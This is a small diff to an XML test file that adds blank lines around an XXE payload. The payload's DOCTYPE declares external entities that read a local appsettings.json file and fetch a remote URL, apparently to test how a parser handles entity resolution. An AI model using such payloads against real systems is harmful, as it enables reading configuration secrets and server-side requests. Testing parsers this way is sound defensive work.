@@ -1,4 +1,5 @@
 ﻿<?xml version="1.0" encoding="utf-8" ?>
+
 <!DOCTYPE Command [
   <!ELEMENT Names (Name) >
   <!ENTITY entity1 "noch kuerzer">
@@ -9,6 +10,7 @@
   <!ENTITY xxe3 SYSTEM "file://C:/temp/testapp2/appsettings.json">
   <!ENTITY xxe4 SYSTEM "https://www.migros.ch/robots.txt">
 ]>
+
 <Command>
   <Name>FindQuote &entity1;</Name>
   <Parameters>
